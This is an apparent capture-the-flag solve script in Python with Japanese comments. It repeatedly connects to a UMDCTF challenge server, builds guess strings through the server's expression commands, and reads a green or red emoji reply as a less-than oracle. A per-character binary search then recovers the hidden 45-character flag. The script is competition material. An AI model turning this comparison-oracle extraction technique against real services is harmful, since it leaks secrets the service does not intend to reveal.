import socket
import time
import sys
import string

# 接続先ホストとポート
HOST = 'challs.umdctf.io'
PORT = 31601

# 受信バッファサイズ
BUFFER_SIZE = 4096

# タイムアウト設定 (秒)。適宜調整してください。
SOCKET_TIMEOUT = 5

# 正規表現に含まれる文字セットを正確に抽出してリスト化し、ソートする
# UMDCTF{} は固定部分
# {} の中の文字セット: [a-zA-Z0-9_,.'"?!@$<>*:\-+ ~#^%\/|\\&=]+
# '-' はセットの中で最後に扱うか、エスケープする必要があるが、ここではシンプルにリスト化し、ソートする
# 集合演算で重複を排除し、ソート
# 元の文字列に '-' が含まれていますが、string.printable などに含まれるものと違い、
# セットの中で単一の文字として扱われるため、そのままリストに追加します。
inner_chars_str = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.,'\"?!@$<>*:+- ~#^%/|\\&="
# inner_chars_str = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.,'\"?!@$<>*:+- ~#^%/|\\&={}"
# 重複を排除し、ソートして文字の順序を固定する
ALLOWED_CHARS = sorted(list(set(inner_chars_str)))

# 未知の文字列の長さ (UMDCTF{} を含む全体で45文字)
TOTAL_LENGTH = 45
# {}の中の文字数
INNER_LENGTH = TOTAL_LENGTH - len("UMDCTF{}") # 45 - 8 = 37

def send_and_receive(sock, data_to_send, wait_for_response=True, wait_time=0):
    """
    データを送信し、必要に応じて応答を受信します。
    """
    full_data_to_send = (data_to_send + '\n').encode('utf-8')
    print(f"[*] Sending 「 {data_to_send} 」")
    try:
        sock.sendall(full_data_to_send)
        if wait_for_response:
            time.sleep(wait_time)
            # サーバーからの応答を待つ
            # プロトコル的に、コマンド送信後にサーバーは何らかの応答を返すはずなので、読み飛ばす
            response = sock.recv(BUFFER_SIZE)
            if not response:
                 print("[!] Connection closed by remote host during send/receive.")
                 return None # 接続が閉じられた
            print(f"[*] Received (ignored): {response.decode('utf-8', errors='ignore').strip()}")
            return response.decode('utf-8', errors='ignore')
        return "" # 応答を待たない場合は空文字列を返す
    except socket.timeout:
        print(f"[!] Timeout while sending or receiving for command: {data_to_send}")
        return None
    except Exception as e:
        print(f"[!] Error sending or receiving for command '{data_to_send}': {e}")
        return None

def network_oracle_is_less_than(guess_string):
    """
    ネットワーク上のサーバーをオラクルとして利用し、
    guess_string が未知のフラグより辞書順で前にあるかどうかを判定する。
    """
    print(f"[*] Querying oracle for: '{guess_string}' < 'f' ?")
    
    try:
        # オラクルクエリごとに新しい接続を確立
        # 必要に応じて、持続的な接続を使用するように修正可能
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.settimeout(SOCKET_TIMEOUT)
            print(f"[*] Connected to {HOST}:{PORT} for oracle query.")

            # --- オラクルプロトコルの実行 ---

            # 1. a="" を送信
            if send_and_receive(s, 'a="" ') is None: return False # エラー時はFalseを返すなど適切に処理

            # 2. guess_string の各文字を a に結合
            for char in guess_string:
                if send_and_receive(s, f'b="{char}"') is None: return False
                if send_and_receive(s, 'a=a+b') is None: return False

            # 3. c=a<f を送信 (応答は無視)
            if send_and_receive(s, 'c=a<f') is None: return False

            # 4. 1/c を送信し、応答で大小関係を判定
            # print("[*] Sending 1/c to get oracle result...")
            final_response = send_and_receive(s, '1/c  ', wait_time=1)

            if final_response is None:
                print("[!] Failed to get final oracle response.")
                return False # 応答が得られなかった場合はエラーまたは特定の判定

            print(f"[*] Final oracle response: {final_response.strip()}")

            # 応答が "ok" なら a < f が True、"ng" なら False
            # サーバーの応答形式に合わせて正確に判定する
            if final_response[-10] == "🟩":
                print("  -> True")
                return True
            elif final_response[-10] == "🟥":
                print("  -> False")
                return False
            else:
                print(f"[!] Unexpected oracle response: {final_response.strip()}")
                # 予期しない応答の場合はエラーとして扱う
                return False # または何らかのエラーを示す値を返す

    except ConnectionRefusedError:
        print(f"[!] Connection refused during oracle query to {HOST}:{PORT}.")
        return False
    except socket.gaierror:
        print(f"[!] Address error during oracle query: Could not resolve host {HOST}.")
        return False
    except socket.timeout:
        print(f"[!] A socket operation timed out during oracle query after {SOCKET_TIMEOUT} seconds.")
        return False
    except Exception as e:
        print(f"[!] An unexpected error occurred during oracle query: {e}")
        return False

# --- 文字位置ごとの二分探索によるフラグ特定プログラム ---

def identify_flag_char_by_char_binary_search(allowed_chars, inner_length, total_length, oracle):
    """
    文字列比較オラクルを利用して、未知のフラグを文字位置ごとに二分探索で特定する。

    Args:
        allowed_chars (list): {} 内で許可される文字のリスト（ソート済み）
        inner_length (int): {} 内の文字数
        total_length (int): フラグの全長
        oracle (function): 推測文字列が未知のフラグより辞書順で前にあるかを判定する関数

    Returns:
        str or None: 特定できたフラグ文字列、またはNone
    """
    # フラグの初期状態: UMDCTF{????????????????????????????????????}
    flag_chars = list("UMDCTF{") + ["?"] * inner_length + ["}"]
    start_index = len("UMDCTF{") # {} の開始インデックス
    end_index = start_index + inner_length # {} の終了インデックス（'}'の直前）

    print("フラグ特定開始...")
    print("初期状態:", "".join(flag_chars))

    try:
        for i in range(inner_length):
            current_pos_index = start_index + i
            print(f"\n位置 {current_pos_index} の文字を探索中 ({{}} 内の {i+1} 文字目)...")

            low = 0
            high = len(allowed_chars) - 1
            found_char = None

            while low < high:
                mid_index = (low + high) // 2
                guess_char = allowed_chars[mid_index]

                # この位置に guess_char を入れた場合の推測文字列を作成
                # 推測文字列は、オラクルが比較できるように、正しいフラグと同じ長さである必要がある
                # 探索中の位置より後ろの文字は、辞書順で最も遅い文字で埋める
                # これにより、「もしこの位置の文字が guess_char なら、
                # その後の文字を最大にした文字列が、正しいフラグより前か後ろか」を判定できる
                # 例: UMDCTF{f[0]f[1]...guess_charZ...Z} < TRUE_FLAG ?
                
                # 現在確定しているプレフィックス部分
                prefix = "".join(flag_chars[:current_pos_index])
                
                # 探索中の文字
                char_to_test = guess_char
                
                # 後続の文字を全て許可文字の中で最も大きい文字（ソート済みのALLOWED_CHARSの最後の文字）で埋める
                # これは、もしこの位置の文字が char_to_test であった場合に、
                # その後の部分が辞書順で最大になるような文字列を作成するため。
                # この test_string が TRUE_FLAG より小さければ、TRUE_FLAG は test_string
                # より後にあるということになり、正しい文字は char_to_test かそれより大きい文字。
                # この test_string が TRUE_FLAG 以上であれば、TRUE_FLAG は test_string
                # かそれより前にあるということになり、正しい文字は char_to_test かそれより小さい文字。
                padding_length = inner_length - (i + 1) # {}の中で、現在の文字より後ろの文字数
                padding = allowed_chars[-1] * padding_length
                
                # フラグの最後の '}' を結合
                test_string = prefix + char_to_test + padding + "}"

                # オラクル呼び出し
                is_less = oracle(test_string)

                # オラクルの結果に基づいて探索範囲を絞り込む
                if is_less:
                    # test_string < TRUE_FLAG が True
                    # -> TRUE_FLAG は test_string より辞書順で後にある。
                    # -> これは、位置 current_pos_index の正しい文字が guess_char か、またはそれより後の文字であることを意味する。
                    # したがって、探索範囲の下限を mid_index + 1 に更新。
                    low = mid_index + 1
                else:
                    # test_string < TRUE_FLAG が False (つまり test_string >= TRUE_FLAG)
                    # -> TRUE_FLAG は test_string 以下である。
                    # -> これは、位置 current_pos_index の正しい文字が guess_char か、またはそれより前の文字であることを意味する。
                    # したがって、探索範囲の上限を mid_index に更新。
                    high = mid_index

            # while ループ終了時、low == high となり、そのインデックス allowed_chars[low] が正しい文字
            correct_char = allowed_chars[low]
            flag_chars[current_pos_index] = correct_char
            print(f"位置 {current_pos_index} の文字を特定しました: {correct_char}")
            print("現在のフラグ状態:", "".join(flag_chars))

        # 全ての文字が特定できた
        final_flag = "".join(flag_chars)
        print("\nフラグ特定完了!")
        print("特定されたフラグ:", final_flag)

        # 特定したフラグが正しいか最終確認（オラクルを使う）
        # 特定したフラグ自身が未知のフラグより小さいということはありえない
        # したがって、oracle(final_flag) は False になるはず
        # また、final_flag + 許可文字の最小文字 も TRUE_FLAG 以上になるはず
        # このあたりの最終確認ロジックは、オラクルの厳密な挙動に依存するため、
        # サーバーの挙動を確認してから調整が必要かもしれない。
        # シンプルに、特定したフラグがオラクルで比較して自身より小さいと判定されないこと、
        # および特定したフラグに1文字加えたものが小さくないと判定されることで確認する。
        
        # 特定したフラグ自身が小さいということはありえない
        is_final_flag_less = oracle(final_flag)
        # 特定したフラグに許可文字の最小文字を付け加えたものが小さいということはありえない
        # (これにより、特定したフラグが正しく、かつ TRUE_FLAG より短いという可能性を排除)
        # ただし、今回の問題では長さが固定なので、このチェックは厳密には不要かもしれないが、
        # オラクルの挙動確認のために行うのは良い。
        # 例: UMDCTF{abc} と UMDCTF{abd} の比較で、UMDCTF{abc} < UMDCTF{abd} は True
        # 我々が UMDCTF{abc} を特定し、TRUE_FLAG が UMDCTF{abd} だった場合、
        # oracle("UMDCTF{abc}" + allowed_chars[0]) は True になる可能性がある。
        # 特定したフラグが正しい場合は、final_flag >= TRUE_FLAG となり、oracle(final_flag) は False。
        # また、final_flag + 任意の文字 >= TRUE_FLAG + 任意の文字 となり、
        # oracle(final_flag + allowed_chars[0]) も False になるはず。
        
        # 以下の最終検証は、オラクルの挙動が厳密に辞書順比較に基づいている場合に有効
        # if not is_final_flag_less:
        #     print("特定されたフラグは正しいようです (final_flag >= TRUE_FLAG を満たす)。")
        # else:
        #      print("警告: 特定されたフラグが正しくない可能性があります (final_flag < TRUE_FLAG と判定された)。")
        
        return final_flag

    except Exception as e:
        print(f"探索中にエラーが発生しました: {e}")
        return None

# --- プログラム実行 ---

if __name__ == "__main__":
    print("CTF フラグ特定スクリプト開始...")
    identified_flag = identify_flag_char_by_char_binary_search(
        ALLOWED_CHARS,
        INNER_LENGTH,
        TOTAL_LENGTH,
        network_oracle_is_less_than # ネットワーク通信を行うオラクル関数を渡す
    )

    if identified_flag:
        print(f"\n最終的に特定されたフラグ: {identified_flag}")
    else:
        print("\nフラグを特定できませんでした。")

    print("\nスクリプト終了。")

